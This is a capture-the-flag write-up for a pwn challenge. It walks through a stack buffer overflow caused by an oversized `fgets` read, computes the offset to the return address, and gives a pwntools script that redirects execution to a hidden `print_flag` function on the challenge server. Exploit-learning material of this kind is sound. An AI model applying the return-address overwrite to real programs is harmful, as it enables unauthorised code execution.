# Fall Challenge 5: trivia

**Category**: pwn  
**Points**: 175  
**Description**:  
Don't even bother trying my new, evil trivia. I've guaranteed that it's impossible. It never even calls the print_flag() function!

---

# Approach

Solving this challenge requires making the program call the `print_flag` function. To do this, we need a way of hijacking the control flow of the program, as it never calls `print_flag` itself. This can be achieved by using a type of buffer overflow that targets a function's return address on the stack frame. This is the address that is placed on the stack when a function is called so that the function knows where in memory to return to after it is finished executing. If we can overflow the function's stack frame all the way to this address, we can set it to an arbitrary address, like that of `print_flag`!

# Process

Inspecting `main`, we find that the program gets user input with the `ask_question` function.

```c
int ask_question(char *question,int answer_size) {
    char input [8];
    ...
    fgets(input,answer_size,stdin);
    ...
}
```

We can see that `ask_question` is vulnerable to a buffer overflow if `answer_size` is greater than `8`. Looking at `main` again, it seems that `QUESTION 2` is the best candidate, as it calls `ask_question` with an `answer_size` of `0x20` (`32` in decimal). 

> [!NOTE]
> The line `puts("\nflag.txt")` is a red-herring: it would just print the string `"flag.txt"` instead of reading the flag file from the server.

```c
int main(void)

{
  ...
  ask_question("\nQUESTION 1:\nWhat year was the chicken invented?: ",8);
  print_wrong();
  ask_question("\nQUESTION 2:\nHow tall is Mt. Everest? (in quectometers): ",0x20); // <--- (o_O)! 
  print_wrong();
  ask_question("\nQUESTION 3:\nDo you like coffee? (yes/no): ",8);
  print_wrong();

  iVar1 = ask_question("\nQUESTION 4:\nDoes pineapple belong on pizza? (no/no): ",10);
  if (iVar1 == 0x59) {
    puts("\nflag.txt");
  }
  else {
    print_wrong();
  }
  return 0;
}
```

Now that we know what our vulnerable function is and where we can exploit it, we need to figure out how much to overflow `input` by. We can analyze `main` in Ghidra to easily see where `input` is in the stack frame.

The function header generated by ghidra looks like this:
```
int        Stack[-0xc]:4       correct
char[8]    Stack[-0x14]:8      input
char *     Stack[-0x20]:8      question_local
int        Stack[-0x24]:4      answer_size_local
```

Here's what that looks like on the stack. The values between `rbp` and `rsp` are inside `ask_question`'s stack frame. 

```
pos  : size
            +----------------+ <- rsp
-0x24 : 4B  | answer_size... | 
            +----------------+
-0x20 : 8B  | question_local |
            +----------------+           +
-0x14 : 8B  | input          |           |
            +----------------+           |
-0xc  : 4B  | correct        |           | 20B
            +----------------+ <- rbp    |
-0x8  : 8B  | saved rbp      |           |
            +----------------+           +
-0x0  : 8B  | return address |
                   ...
```

We need a payload that will overflow the 20 bytes from `input` through `correct` and `saved rbp` to `return address`, where we can insert the address of the `print_flag` function. We search for the `print_flag` function in Ghidra to see that it begins at address `0x401361`.

Putting this all together gives us a payload containing 20 bytes of filler to overwrite `input`, `correct`, and `saved rbp` plus the 8 byte `print_flag` address.

I used the python library `pwntools` to send the payload because the address in our payload does not map to any characters I can type on a keyboard. The script below connects to the challenge server, sends two empty lines for the first two questions, then delivers the payload to `QUESTION 2` and returns control to the user.

```python
import pwn

host, port = 'trivia.ctf-league.osusec.org', 1305
# elf = pwn.ELF('./main', checksec=False)   # For local testing

p = pwn.remote(host, port)
# p = elf.process()   # For local testing

payload = b'A'*(8 + 4 + 8) + pwn.p64(0x401361) + b'\n'

p.sendline(b'')      # name
p.sendline(b'')      # Q1
p.sendline(payload)  # Q2
p.interactive()
```

Running the script causes a buffer overflow when `ask_question` calls the unsafe `fgets`. This causes the stack frame's return address to be overwritten with the address of `print_flag`. When `ask_question` returns, the program enters `print_flag`, giving us this challenge's flag.
